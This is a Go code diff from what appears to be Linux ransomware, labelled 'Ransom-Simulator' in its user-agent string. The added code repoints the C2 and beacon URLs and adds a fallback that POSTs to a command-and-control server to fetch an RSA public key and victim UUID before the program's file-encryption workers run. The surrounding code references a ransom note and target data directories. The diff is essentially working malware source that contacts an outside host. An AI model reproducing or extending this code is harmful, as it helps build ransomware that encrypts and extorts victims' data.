@@ -9,6 +9,7 @@ import (
 	"crypto/rsa"
 	"crypto/sha256"
 	"crypto/x509"
+	"encoding/json"
 	"encoding/pem"
 	"flag"
 	"fmt"
@@ -27,8 +28,8 @@ import (
 
 const (
 	version   = "v3.0-Beta-Linux"
-	apiURL    = "https://rsa-uuid.api.yangzifun.org"
-	beaconURL = "https://bad-c2-server.api.yangzifun.org/beacon_check_in"
+	apiURL    = "https://encrypt.yangzifun.org/E56dSY"
+	beaconURL = "https://encrypt.yangzifun.org/beacon_check_in"
 )
 
 const ransomNoteContent = `
@@ -126,6 +127,9 @@ var (
 	publicKeyCacheStr  string
 	publicKeyCacheLock sync.RWMutex
 
+	// 公钥变量
+	publicKeyPEM string
+
 	// 程序所在目录
 	programDir string
 
@@ -220,6 +224,13 @@ var (
 		"/data/db",
 	}
 )
+
+type APIResponse struct {
+	PublicKeyPEM string `json:"public_key_pem"`
+	UUID         string `json:"uuid"`
+	Status       string `json:"status"`
+	Message      string `json:"message"`
+}
 
 type fileLog struct {
 	mu   sync.Mutex
@@ -1207,25 +1218,37 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 	jobs := make(chan string, len(files))
 	var wg sync.WaitGroup
 
-	// 从公钥文件名中提取UUID
-	fmt.Print("[*] 从公钥文件名提取UUID... ")
+	// 尝试从公钥文件名中提取UUID
+	fmt.Print("[*] 尝试从公钥文件名提取UUID... ")
 	uuid, err := extractUUIDFromFilename()
 	if err != nil {
 		fmt.Printf("失败: %v\n", err)
-		fmt.Println("[!] 无法从公钥文件名提取UUID，程序终止")
-		os.Exit(1)
-	}
-	fmt.Printf("成功: %s\n", uuid)
+		fmt.Println("[*] 尝试从网络获取密钥...")
 
-	// 从本地文件读取公钥
-	fmt.Print("[*] 从本地文件读取公钥... ")
-	publicKeyPEM, err2 := readPublicKeyFromFile(uuid)
-	if err2 != nil {
-		fmt.Printf("失败: %v\n", err2)
-		fmt.Println("[!] 无法读取公钥文件，程序终止")
-		os.Exit(1)
+		// 尝试从网络获取
+		resp, err2 := fetchKeysFromAPI()
+		if err2 != nil {
+			fmt.Printf("[!] 连接C2获取密钥失败: %v\n", err2)
+			fmt.Println("[!] 无法获取密钥，程序终止")
+			os.Exit(1)
+		}
+		uuid = resp.UUID
+		publicKeyPEM = resp.PublicKeyPEM
+		fmt.Printf("[*] 从网络获取UUID: %s\n", uuid)
+	} else {
+		fmt.Printf("成功: %s\n", uuid)
+
+		// 从本地文件读取公钥
+		fmt.Print("[*] 从本地文件读取公钥... ")
+		var err2 error
+		publicKeyPEM, err2 = readPublicKeyFromFile(uuid)
+		if err2 != nil {
+			fmt.Printf("失败: %v\n", err2)
+			fmt.Println("[!] 无法读取公钥文件，程序终止")
+			os.Exit(1)
+		}
+		fmt.Println("成功")
 	}
-	fmt.Println("成功")
 
 	// 预解析公钥，确保格式正确
 	fmt.Print("[*] 预解析公钥... ")
@@ -1314,6 +1337,38 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 	if logEnabled {
 		logOperation(fmt.Sprintf("加密工作完成: 成功 %d, 失败 %d", stats.success.Load(), stats.failed.Load()))
 	}
+}
+
+func fetchKeysFromAPI() (*APIResponse, error) {
+	jsonBody := []byte("{}")
+	req, err := http.NewRequest("POST", apiURL, bytes.NewBuffer(jsonBody))
+	if err != nil {
+		return nil, fmt.Errorf("创建请求失败: %w", err)
+	}
+	req.Header.Set("User-Agent", "Ransom-Simulator/"+version)
+	req.Header.Set("Content-Type", "application/json")
+	client := &http.Client{Timeout: 5 * time.Second}
+	res, err := client.Do(req)
+	if err != nil {
+		return nil, fmt.Errorf("请求API失败: %w", err)
+	}
+	defer func() { _ = res.Body.Close() }()
+	if res.StatusCode != http.StatusOK {
+		body, _ := io.ReadAll(res.Body)
+		return nil, fmt.Errorf("API返回异常状态码: %d, Body: %s", res.StatusCode, string(body))
+	}
+	body, err := io.ReadAll(res.Body)
+	if err != nil {
+		return nil, fmt.Errorf("读取响应体失败: %w", err)
+	}
+	var apiResp APIResponse
+	if err := json.Unmarshal(body, &apiResp); err != nil {
+		return nil, fmt.Errorf("解析JSON失败: %w", err)
+	}
+	if apiResp.UUID == "" || apiResp.PublicKeyPEM == "" {
+		return nil, fmt.Errorf("API响应无效，缺少UUID或公钥")
+	}
+	return &apiResp, nil
 }
 
 // 清理公钥格式
